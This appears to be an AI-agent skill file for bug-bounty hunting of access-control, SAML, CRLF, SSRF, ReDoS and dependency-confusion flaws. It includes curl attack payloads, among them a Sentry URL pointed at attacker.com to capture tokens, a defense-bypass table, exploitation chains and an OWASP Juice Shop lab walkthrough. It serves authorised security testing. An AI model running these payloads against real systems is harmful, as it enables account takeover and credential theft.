---
name: hunt-misc
description: "Hunt the long-tail access-control and logic bugs that don't fit a single named class — post-removal session/token persistence (soft-delete without revocation), invitation-flow acceptance without email verification, token-scope checked at issuance but not at use, cross-tenant resource access, SAML signature stripping / XSW assertion wrapping, CRLF / HTTP header injection in Ruby Net::HTTP and Rack/pitchfork, SSRF and token exfil via admin config URL fields (Sentry DSN, webhook URLs), ReDoS in Ruby URI/IPAddr parsers, package-registry dependency confusion, and dangling-DNS / SPF-DMARC hygiene. Use when hunting on SaaS role hierarchies, multi-tenant systems, invitation/SSO flows, internal APIs, and PAT/OAuth scope enforcement."
sources: github, hackerone_public
---

# HUNT-MISC — Access-Control, Auth-Logic & Misconfiguration Long-Tail

## Crown Jewel Targets

**Why this vuln class pays:**
MISC vulnerabilities span access control failures, information disclosure, session/auth logic bugs, and misconfiguration — the categories that consistently produce the highest payouts because they map directly to business impact: data exposure, account takeover, privilege escalation, and infrastructure compromise.

**Highest-value targets:**
- **SaaS platforms with role hierarchies** (Shopify, GitHub, GitLab) — any boundary between owner/admin/staff/guest is a privilege escalation surface
- **Identity/auth flows** — invitation links, password reset, SAML SSO, OAuth token scopes
- **Multi-tenant systems** — one tenant touching another tenant's data
- **Internal APIs** — LFS endpoints, pre-receive hooks, internal GraphQL/REST that assume caller is trusted
- **Domain/DNS management features** — transfer controls, subdomain delegation
- **Token/credential management** — PAT scopes, deploy keys, API tokens stored in config fields

**Asset types that pay most:**
- Core product APIs (not marketing subdomains)
- Enterprise/self-hosted editions (GitHub Enterprise, GitLab EE)
- Partner/collaborator invitation systems
- OAuth app integrations and webhook endpoints

---

## Attack Surface Signals

**URL patterns to watch:**
```
/admin/*/transfer
/invitations/*
/partners/*/accept
/api/v*/repos/*/lfs/*
/-/settings/integrations/sentry
/api/v*/user/installations
/hooks/pre-receive/*
/reset-password?token=
/auth/saml/callback
/api/v*/packages/pypi/*
```

**Response header signals:**
```
X-Request-Id (pitchfork/Rack — check for header injection)
X-Shopify-Shop-Api-Call-Limit
X-GitLab-*
```

**JS patterns revealing internal surfaces:**
```javascript
// Look for hardcoded internal API paths
fetch('/internal/api/
graphql { installations(
"scope": [], // empty scopes on tokens
"permissions": {"contents": "read"} // minimal scope PATs
```

**Tech stack signals:**
- Ruby/Rack middleware (CRLF injection risk in `pitchfork`)
- SAML SSO enabled on enterprise instances
- PyPI proxy/mirror configurations (dependency confusion)
- Sentry error tracking integration fields (SSRF/token leak vector)
- Multi-role invitation systems (partners, staff, collaborators)

---

## Step-by-Step Hunting Methodology

1. **Map all role/permission boundaries** — enumerate every role level (owner → admin → staff → guest → removed) and document what each role *should* see

   **Marker Discipline:** when probing role boundaries by injecting unique tokens / identifiers into per-role test data, markers MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `attacker`, `evil`, `admin`, `AAAA`. Good markers: `cpmark987abc`, `x4hd2k9pq`. Before claiming any reflection, search the baseline (no-marker) response for the marker — if it appears naturally, change your marker.

   **Body-Diff Rule:** a privilege-bypass claim requires response BODY differential, not status-code-only. 200 OK with byte-identical body to baseline is NOT a bypass. Always diff bodies side-by-side before claiming bypass. Status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms.

2. **Test invitation flows end-to-end** — accept invitations without completing verification steps; modify invitation tokens; test whether accepting an invitation as a different user grants access

3. **Test post-removal access** — add a user to a resource, remove them, then test if their session/token still grants access (especially after company/org removal)

4. **Fuzz token scope enforcement** — create PATs/tokens with minimal or no scopes, then call API endpoints that *should* require elevated scopes

5. **Test cross-tenant resource access** — as Tenant A, attempt to read/write Tenant B's resources by manipulating IDs, paths, or headers

6. **Probe internal/undocumented API endpoints** — look for LFS endpoints, internal GraphQL operations, pre-receive hook environments, webhook delivery logs

7. **Check SAML/SSO logic** — test signature verification bypass by stripping signatures, modifying NameID, replaying assertions, or manipulating XML namespace

8. **Audit configuration fields for SSRF/token exfiltration** — any URL field in admin settings (Sentry DSN, webhook URL, proxy URL) is a potential SSRF or credential leak

9. **Test password reset and email verification flows** — skip email verification steps; test whether reset tokens are scoped to a single user; test token reuse

10. **Check HTTP header injection points** — any user-controlled input passed into response headers via Ruby/Rack middleware; test CRLF sequences

11. **Verify DNS/subdomain hygiene** — enumerate subdomains, check for dangling CNAME records, verify SPF/DMARC/DKIM records

12. **Test package registry proxy configurations** — look for dependency confusion via forwarded requests to public registries (PyPI, npm, RubyGems)

---

## Payload & Detection Patterns

**CRLF/Header Injection (Ruby Net::HTTP, Rack/pitchfork):**
```bash
# Test CRLF in header values
curl -v "https://target.com/path" \
  -H $'X-Custom: value\r\nInjected-Header: evil'

# URL-encoded variant
curl -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"

# Test in pitchfork/Rack apps — inject via query param reflected in Location header
curl -v "https://shop.myshopify.com/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

**Privilege escalation via invitation bypass:**
```bash
# Accept invitation without email verification
curl -X POST "https://target.com/invitations/INVITE_TOKEN/accept" \
  -H "Cookie: session=UNVERIFIED_SESSION" \
  -d '{"role":"admin"}'

# Test invitation token for another user
curl -X GET "https://target.com/partners/PARTNER_ID/invitation/accept?token=LEAKED_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION"
```

**Token scope bypass (GitHub/GitLab PAT):**
```bash
# Call privileged endpoint with minimal-scope token
curl -H "Authorization: token ghp_MINIMAL_SCOPE_TOKEN" \
  "https://api.github.com/repos/org/private-repo/issues"

# Test suspended installation access
curl -H "Authorization: Bearer USER_TO_SERVER_TOKEN" \
  "https://api.github.com/app/installations/SUSPENDED_INSTALL_ID"
```

**SSRF via config URL fields (Sentry integration):**
```bash
# Change Sentry URL to internal listener
curl -X PUT "https://gitlab.com/api/v4/projects/PROJECT_ID/services/sentry" \
  -H "PRIVATE-TOKEN: MAINTAINER_TOKEN" \
  -d '{"api_url": "https://attacker.com/capture", "auth_token": "sentry_token"}'
```

**ReDoS detection:**
```bash
# Test Ruby URI parser
ruby -e 'require "uri"; URI.parse("http://a.com?" + "a"*5000 + "##")'

# Test IPAddr
ruby -e 'require "ipaddr"; IPAddr.new("0." * 1000 + "0")'

# Timing-based detection
time curl "https://target.com/search?q=aaaa" # baseline
time curl "https://target.com/search?q=$(python3 -c 'print("a"*5000 + "##")')"
```

**Grep patterns for source recon:**
```bash
# Find SAML signature verification
grep -r "validate_signature\|verify_signature\|skip.*signature" --include="*.rb"

# Find hardcoded or weak scope checks
grep -r "without_scope\|any_scope\|scope.*bypass" --include="*.rb"

# Find invitation acceptance without verification
grep -r "accept.*invitation\|invitation.*accept" --include="*.rb" | grep -v "verified\|confirmed"

# Find internal API routes
grep -r "internal_api\|/_internal/\|/internal/" --include="*.rb" --include="*.js"
```

**Dangling subdomain / DNS check:**
```bash
# Check for obsolete DNS records
dig CNAME handbook.gitlab.com
curl -sI https://handbook.gitlab.com | head -5
# Look for NXDOMAIN or 404 on hosting provider = takeover candidate

# SPF check
dig TXT rubylang.org | grep spf
# Missing or ~all = email spoofing risk
```

---

## Cryptographic Failures & Encoding-as-Crypto (Juice Shop P2/P3)

OWASP Juice Shop (SQLite backend; auto-CRUD REST exposed at `http://localhost:3000/api/{Model}` and named REST at `http://localhost:3000/rest/{noun}`; Angular client-side-only route guards and form validation) repeatedly disguises **reversible encoding as encryption**. The senior move is to recognise a primitive as encoding (always reversible, no key, or a leaked key) versus real crypto, then reverse it offline. None of these need to defeat math — they need you to spot the smell and decode.

### Reversible-encoding-masquerading-as-crypto smell list

Treat the following as **encoding, not secrecy** — decode locally, never brute-force:
- **z85 / Base85 / Ascii85** — coupon-shaped strings (Juice Shop discount coupons encode `MMM-YY` month/year + discount in z85).
- **Hashids** — short opaque IDs (e.g. order/basket references) that decode deterministically once you know the salt. Juice Shop's salt is hardcoded and recoverable from a leaked manifest (see SCA section).
- **base64 / base32 / hex** layered with **ROT13 / ROT47 / Caesar** and/or single-byte **XOR** — the multi-layer "puzzle" pattern (Nested Easter Egg).
- **Weak primitive smell list — flag on sight in any recovered source/config:** `MD5(` / `crypto.createHash('md5')`, `RC4`, AES in **ECB** mode (`aes-256-ecb`, identical plaintext blocks → identical ciphertext blocks), and a **hardcoded HMAC key** (e.g. a literal `'pa$$w0rd'`-style secret used for signing). Any of these = the data is effectively unprotected.

### z85 forged discount coupon → Forged Coupon

Juice Shop coupons are a z85-encoded `MMM-YY` + discount string, not a signed token — so any attacker can forge a maximal discount for the current month. Recognise the coupon shape, encode your own with the same z85 alphabet, and apply it at checkout.

```bash
# Recover the coupon format / z85 alphabet from the client bundle, then forge offline.
curl -s http://localhost:3000/main.js | grep -iEo 'z85|coupon|[0-9]{2}-[0-9]{2}' | head
# Forge a 99% coupon for the current month (MMM-YY) using z85, then submit at checkout:
python3 - <<'PY'
# z85 alphabet per ZeroMQ RFC32; Juice Shop coupon = base85(`<MMM-YY>-<discount>`)
import datetime
print("encode '%s-99' with z85 and POST to /rest/basket/{id}/coupon/<z85coupon>" %
      datetime.date.today().strftime("%b-%y").upper())
PY
# Apply the forged coupon (named REST noun, not /api/{Model}):
curl -s -X PUT "http://localhost:3000/rest/basket/1/coupon/<Z85_FORGED_COUPON>" \
  -H "Authorization: Bearer <JWT>"
```
**Unlocks:** Forged Coupon.

### Hashids with leaked hardcoded salt (from package.json.bak) → Premium Paywall / Weird Crypto

Once the hardcoded Hashids salt is recovered (see leaked-manifest SCA below — the salt and the premium-content path leak via a backup manifest), you can decode/encode the obfuscated IDs and reach gated content. The "encryption" guarding premium content is a static Hashids/encoding pass with a known salt.

```bash
# Premium content is referenced by an encoded path discoverable in the bundle/manifest:
curl -s http://localhost:3000/main.js | grep -iEo 'hashids|salt|premium|this.io.|/assets/[^"'"'"']+' | head
# After recovering the salt, decode the obfuscated id and fetch the gated asset:
curl -s "http://localhost:3000/this/page/is/hidden/behind/an/incredibly/high/paywall/that/is/so/very/expensive/that/those/who/can/afford/it/will/never/buy/it/let/alone/eat/it/the/most/expensive/product/in/the/world-precious-aroma.json"
```
**Unlocks:** Premium Paywall, Weird Crypto (the application uses cryptographically weak / reversible primitives instead of real encryption).

### Ciphertext + key in an HTML comment → Imaginary Challenge

When both ciphertext and its key sit together (e.g. an HTML/JS comment, or AES-ECB ciphertext with the key beside it), "encryption" is theatre — concatenate and decrypt offline. Juice Shop hides the solve token for the Imaginary Challenge this way; the challenge only registers when you decrypt the embedded blob and submit the recovered value.

```bash
# Pull comments / inline secrets out of the served HTML + bundle:
curl -s http://localhost:3000/ | grep -iE '<!--|key|iv|cipher|aes|ecb'
curl -s http://localhost:3000/main.js | grep -iEo 'aes-256-ecb|createCipher|<!--.*-->' | head
# Decrypt the embedded ciphertext with the co-located key (AES-ECB / weak primitive), then submit the recovered token.
```
**Unlocks:** Imaginary Challenge.

### Multi-layer base64/ROT/XOR decode → Nested Easter Egg

The Nested Easter Egg payload is layered encoding (typically base64 → ROT13/XOR → base64). Peel one layer at a time; each layer reveals the next encoder, not plaintext, until the final hidden route emerges.

```bash
# Find the obfuscated blob in the bundle:
curl -s http://localhost:3000/main.js | grep -iEo 'eyJ[A-Za-z0-9+/=]{20,}|[A-Za-z0-9+/=]{40,}' | head
# Peel layers offline (illustrative — try base64, then rot13/rot47, then base64/xor):
python3 - <<'PY'
import base64, codecs
blob = "<BLOB_FROM_BUNDLE>"
step1 = base64.b64decode(blob).decode(errors="ignore")  # layer 1
step2 = codecs.decode(step1, "rot_13")                   # layer 2 (try rot13/rot47/xor)
print(step2)  # repeat base64-decode until a /the/hidden/easteregg-style route appears
PY
# Then GET the revealed nested route to register the solve.
```
**Unlocks:** Nested Easter Egg.

### Leaked-manifest SCA — recover package.json[.bak]/yarn.lock → dependency CVE + typosquat map

Juice Shop leaks its own dependency manifest via a backup file (`package.json.bak`, served from the static FTP/file area). Recovering it gives you the exact dependency versions to feed an SCA pipeline, plus the hardcoded Hashids salt above. Map versions to known CVEs (`npm audit` / `osv-scanner` / `retire.js`) and diff package names against the registry to catch typosquats / look-alike forks the app actually ships.

```bash
# Recover the leaked manifest(s) from the exposed static/FTP area:
curl -s -o /tmp/package.json.bak "http://localhost:3000/ftp/package.json.bak"
curl -s -o /tmp/package.json     "http://localhost:3000/ftp/package.json"
curl -s -o /tmp/yarn.lock        "http://localhost:3000/ftp/yarn.lock"

# CVE map the recovered tree (any of the three; offline, against the leaked lockfile):
( cp /tmp/package.json /tmp/yarn.lock /tmp/sca/ 2>/dev/null; cd /tmp/sca && npm audit --json )
osv-scanner --lockfile=/tmp/yarn.lock
retire --jspath /tmp/sca --outputformat json

# Typosquat / look-alike diff: compare each dependency name against the canonical registry name
# (homoglyphs, extra hyphen, scope swap, deprecated fork) — flag the vulnerable/forked one the app actually pins.
grep -oE '"[a-z0-9@/_-]+": *"[0-9]' /tmp/package.json | sort -u
```
**Unlocks:** Vulnerable Library (find and report the disclosed vulnerable dependency), Legacy Typosquatting / Frontend Typosquatting (report the typosquatted/look-alike package the app depends on). The recovered salt also feeds the Hashids decode above (Premium Paywall / Weird Crypto).

**Operator note:** the Angular client enforces nothing server-side — route guards and form validation are client-only. Every decode above is submitted directly to `http://localhost:3000/api/{Model}` or `http://localhost:3000/rest/{noun}`, bypassing the SPA entirely. Crypto-failure smell + leaked manifest are the two cheapest P2/P3 wins because they need offline decoding, not live exploitation.

---

## Common Root Causes

1. **Soft deletes without permission invalidation** — removing a user from an org marks them as removed but doesn't revoke active sessions or cached permission checks; subsequent API calls still pass old auth context

2. **Invitation acceptance without verification gate** — developers implement invitation flow optimistically (assume user who received email is legitimate) and skip re-verification when token is consumed by a different session

3. **Token scope checked at issuance, not at use** — PAT/OAuth scopes validated when token is created but individual API endpoint handlers don't re-check scope, trusting middleware that may have a gap

4. **Role-based access control checked at UI layer only** — frontend hides buttons for restricted roles but backend API endpoints don't enforce the same restriction; direct API calls bypass UI gating

5. **SAML XML parsing quirks** — signature covers only part of the document; XML canonicalization differences allow unsigned content to pass verification; namespace prefix attacks

6. **Config/URL fields trusted as internal** — integration URL fields (Sentry, webhooks) assumed to be set only by trusted admins; maintainer-level roles can modify them to exfiltrate tokens

7. **Ruby header injection via string interpolation** — developer builds HTTP response headers by string concatenation without sanitizing newlines; Rack 3 behavioral changes exposed previously-hidden bugs

8. **Proxy/mirror configs forwarding all requests upstream** — package registries configured to fall back to public registries without restricting which packages are internal-only, enabling dependency confusion

9. **Pre-receive hook environments exposing privileged context** — hook scripts run with access to internal environment variables, git internals, or SSH keys that shouldn't be user-accessible

10. **Multi-device session design conflated with session fixation** — engineers implement "remember me across devices" by issuing non-expiring tokens, treating it as a feature while creating persistent access risk

11. **Server-policy responses mistaken for state-based oracles** — when many different path types return the SAME response shape, suspect a server-side blocklist/policy filter, NOT a real file-existence / user-existence / resource-existence oracle. Engineers add blanket filters (e.g., "block any path ending in `.config`/`.ashx`/`.asmx`/`.svc`") that return the same error regardless of whether the underlying file exists. Don't infer "file exists" from "blocked"; verify with an independent signal (Collaborator callback, response-time differential at scale, or out-of-band confirmation). Lesson: SharePoint's `download.aspx?SourceUrl=` returned `"blocked from this Web site by the server administrators"` for `.ashx`/`.asmx`/`.svc`/`.config` extensions regardless of whether the underlying file existed — looked like a file-existence oracle, was actually the extension blocklist. Treating it as the former produced a list of "discovered custom customer-branded endpoints" that didn't actually exist.

---

## Bypass Techniques

**Defender mitigations and how to bypass them:**

| Defense | Bypass |
|---|---|
| Email verification on invitation | Accept token in a different session before verification step completes; test if token is single-use or multi-use |
| Role check on API endpoint | Find alternative API versions (`/v3/` vs `/v4/`), GraphQL aliases, or internal endpoints that skip middleware |
| SAML signature validation | Strip signature element entirely; use XML namespace confusion; inject additional unsigned `Assertion` elements |
| PAT scope enforcement | Find endpoints that check scope at the collection level but not on individual sub-resources; test legacy API versions |
| Token revocation on user removal | Revoke at the org level but not at the app/installation level; test cross-installation token reuse |
| Input sanitization on header values | Try `%0d%0a`, `\r\n`, `\u000d\u000a`, null bytes followed by CRLF; test middleware version-specific parsing |
| Restricting internal API to localhost | Find SSRF vector (Sentry URL, webhook URL) to make server call the internal endpoint on your behalf |
| ReDoS regex hardening | Try different anchor points — if `#` is patched, try `?`, `%`, or other RFC-special characters that trigger backtracking |
| Dependency pinning | Change package names slightly (typosquatting) or target internal package names that aren't published to public registry |
| Subdomain claim validation | Monitor for hosting provider account deletions; use certificate transparency logs to find unclaimed subdomains |

---

## Gate 0 Validation

Before writing the report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be a concrete action: read customer PII, escalate to admin role, take over an account, transfer a domain asset, exfiltrate an API token, inject a response header. "Could potentially..." is not sufficient.

2. **What does the victim LOSE?**
   Must map to a real asset: customer data, account control, financial assets (domains), credentials, code repository contents, or platform trust. "Security best practices not followed" is not a valid answer.

3. **Can it be reproduced in 10 minutes from scratch?**
   Write out the exact steps (no special tooling, no race conditions that require luck). If you need pre-existing conditions (e.g., must already be a maintainer), state them explicitly and verify they're realistic for an attacker to achieve.

---

## Real Impact Examples

**Scenario A — Privilege Escalation via Unverified Partner Invitation (Shopify-class)**
An attacker receives a partner invitation link for a low-privilege role. Before completing email verification, they use the invitation token in a session authenticated as a different account (or no account). The platform grants the elevated partner role without confirming identity, allowing the attacker to access merchant data, install apps, or modify store configurations for all stores in the partner account. Business impact: full partner-level access to hundreds of merchant stores with no legitimate relationship established.

**Scenario B — Cross-Tenant Data Persistence After Removal (Shopify/GitLab-class)**
A staff member with restricted permissions is removed from a company account after a dispute. Their session token remains valid because revocation only updates the membership table, not the session store. The ex-employee continues to access customer PII, order data, and financial reports via direct API calls for days or weeks post-termination. Business impact: GDPR/CCPA breach exposure, potential extortion leverage, competitive intelligence theft.

**Scenario C — SAML Signature Bypass for Account Takeover (GitHub Enterprise-class)**
An attacker targeting a GitHub Enterprise instance with SAML SSO enabled crafts a SAML response where the `Signature` element is stripped or moved to cover only a non-critical assertion attribute. The XML parser accepts the document as valid; the signature verifier passes because the signed sub-element validates correctly; the NameID (username/email) in the unsigned portion is set to a victim admin account. Attacker authenticates as the victim with no knowledge of their password or MFA. Business impact: full admin access to all private repositories, CI/CD secrets, and GitHub Actions workflows in the enterprise.

---

## Chains & Compositions (Senior Hunting)

A checklist tells you what to look for one bug at a time. Senior work composes primitives into multi-step engagements that reach impact. Each chain below is built from existing primitives in this skill's methodology and root causes — paired with a secondary primitive from a neighbouring skill. The pattern across them all: **the secondary primitive is what produces impact**. A standalone soft-delete IDOR is N/A; pair it with a session-store that doesn't invalidate, and it's High.

### Chain 1 — Soft-Delete + Post-Removal Session Persistence → Cross-Tenant PII

- **A.** Identify a "remove member" endpoint that flips an `active=false` flag or deletes a membership row but does NOT invalidate the user's session or revoke their issued tokens (root cause #1: soft deletes without permission invalidation).
- **B.** Log in as the to-be-removed staff member; capture the session cookie / PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue the same API calls (`GET /admin/orders`, `GET /admin/payouts`, `GET /admin/customers`) using the captured token.
- **Impact:** API calls keep succeeding for days or weeks post-removal — cached permission checks pass the old auth context. GDPR/CCPA breach exposure; potential extortion leverage; competitive intelligence theft.
- **Real shape:** Shopify removed-staff session persistence class (2022); GitLab cached-permissions-after-removal class. Pairs with `hunt-ato` Path 5 (session-fixation).

### Chain 2 — Invitation Token Reuse + Skipped Verification → Privileged Role Injection

- **A.** Receive an invitation link for a low-privilege role at the target.
- **B.** Before completing email verification, POST the invitation token from a different session (incognito browser / anonymous request).
- **C.** Server grants the invited role without re-verifying that the consuming session matches the invited email — new identity inherits the invitation's scope.
- **Impact:** Privilege-escalated foothold without owning the invited email address. For partner-portal invitations (where a partner-tier role manages hundreds of downstream merchants), this is the Shopify Partners-class Critical.
- **Real shape:** Multiple H1 Shopify Partners disclosures 2020-2022 (root cause #2). Pairs with `hunt-auth-bypass` step 7 (invitation flow verification).

### Chain 3 — CRLF in Ruby Header + Cache Poisoning → Mass Stored XSS at CDN Scale

- **A.** Identify CRLF injection in a Ruby `Net::HTTP` / Rack response header — user-controlled value flows into `Location:` or a custom `X-*` header (root cause #7: Ruby header injection via string interpolation).
- **B.** Inject `%0d%0aSet-Cookie: session=attacker` or a duplicate `Cache-Control: public, max-age=3600` that pollutes the cache-key normalisation across CDN tiers.
- **C.** Cache stores the poisoned response for the full max-age. Every CDN-edge visitor in the affected geo receives the attacker's `Set-Cookie` or attacker-controlled body.
- **Impact:** Cross-customer XSS / session fixation at full CDN scale; persistent until cache TTL expires; affects every visitor to that path.
- **Real shape:** GitLab CRLF + cache poisoning chain (H1 #1160407 / Iustin Ladunca, 2021); Rack 3 behavioural-change ecosystem advisories (2022-2023). Pairs with `hunt-cache-poison` citation #7 and #10 (Akamai hop-by-hop class).

### Chain 4 — SAML XSW + Parser Differential → Admin Claim Injection → SSO ATO

- **A.** Capture a valid SAMLResponse via the legitimate auth flow (Burp filter for `SAMLResponse=` POST bodies on `/saml/acs` or `/Shibboleth.sso`).
- **B.** Inject a sibling `<Assertion>` element so the signature-checker XML parser (REXML/Xerces) resolves a different node than the business-logic XML parser (Nokogiri/JAXP). Sign the outer benign assertion; embed `<NameID>admin@victim</NameID>` in the unsigned inner assertion.
- **C.** SP signature validates against the outer element; SP business logic reads the inner one; admin role assumed without password or MFA.
- **Impact:** Full enterprise SSO compromise. Every SAML-gated app inherits the spoofed admin identity for the session lifetime.
- **Real shape:** GitHub Enterprise CVE-2025-25291 / CVE-2025-25292 (parser differential, 2025); samlify CVE-2025-47949. Cross-refs `hunt-auth-bypass` Disclosed Report Citation #5 and #7, and root cause #5 (SAML XML parsing quirks).

### Chain 5 — Token-Scope Check at Issuance, Not at Use → Cross-Tenant Write via Low-Scope PAT

- **A.** Create a personal access token / OAuth token with `read:user` scope only. Confirm via `GET /api/me/tokens`.
- **B.** Call a write endpoint that should require `write:*` (e.g. `DELETE /repos/{org}/{repo}/issues/{n}`). Server checks "is authenticated" via middleware but the individual handler doesn't re-verify the PAT's scope subset.
- **C.** Write action succeeds despite the token being read-only.
- **Impact:** PAT scope model is functionally broken — every read-only token is write-equivalent on the affected endpoints. Mass-exploitable across the userbase by anyone with a leaked PAT.
- **Real shape:** GitHub PAT scope-at-issuance-not-at-use class (root cause #3). Pairs with step 4 (PAT scope enforcement fuzzing) and `hunt-api-misconfig` JWT scope bypasses.

### Chain 6 — Subdomain Takeover at OAuth `redirect_uri` Allowlist → Auth-Code Theft → ATO

- **A.** Enumerate OAuth `redirect_uri` allowlist via the `/oauth/authorize` flow; note any wildcard `*.target.com` or takeover-candidate hostname in the static list.
- **B.** Find a takeover-able subdomain (`legacy.target.com` CNAME'd to deleted Vercel project / Heroku app / S3 bucket — `hunt-subdomain` step 1).
- **C.** Claim the subdomain. Host an OAuth callback receiver. Send victim to `/oauth/authorize?redirect_uri=https://legacy.target.com/cb&response_type=code&...`. Auth code lands on attacker host. Exchange via token endpoint. ATO.
- **Impact:** Persistent 1-click ATO every time the OAuth flow runs against the affected client.
- **Real shape:** Microsoft Azure DevOps `cloudapp.azure.com` + wildcard `*.visualstudio.com` reply_to chain (Binary Security, Nov 2022). Cross-refs `hunt-subdomain` Disclosed Report Citation #12.

### Operator-level pattern

When you confirm a misc primitive at A, **immediately** ask: what state-machine, cache layer, sibling endpoint, or auth-state-skew can amplify it? The first primitive is the entry pass. The chain is the deliverable. Every Workstream-A skill citation in this bundle pairs with at least one chain shape above:
- `hunt-auth-bypass` — Chains 2, 4, 5
- `hunt-cache-poison` — Chain 3
- `hunt-saml` — Chain 4
- `hunt-subdomain` — Chain 6
- `hunt-ato` — Chains 1, 2, 5, 6 (all terminal-impact paths)

---

## Related Skills & Chains

- **`hunt-saml`** — SAML signature wrapping (XSW1–XSW8) is the canonical "misc auth" critical. Chain primitive: SAML XSW + `hunt-saml` AttributeStatement injection → NameID swap → ATO of victim admin via SSO with no password.
- **`hunt-business-logic`** — Misc role/permission desync bugs overlap with business-logic state-machine flaws. Chain primitive: business logic (invitation-before-verify) + role assignment without identity confirmation → tenant takeover.
- **`hunt-auth-bypass`** — Session-revocation gaps and stale-token issues are pure auth-bypass primitives. Chain primitive: removed user retains session token → `hunt-auth-bypass` → post-termination data exfil and persistent access.
- **`hunt-ato`** — Most misc auth bugs end at account takeover. Chain primitive: signature-stripping / NameID injection + `hunt-ato` Path 6 (JWT/SAML manipulation) → admin ATO across enterprise.
- **`security-arsenal`** — Load the SAML Raider payload pack, the session-revocation probe checklist, and the Always-Rejected list (rate-limiting on auth, theoretical issues, user enumeration without sensitive PII).
- **`triage-validation`** — Apply the 7-Question Gate plus the Body-Diff Rule: misc bugs are the highest-N/A category — a state desync claim needs a concrete cross-tenant read or admin-action PoC, not just "the API let me call it".
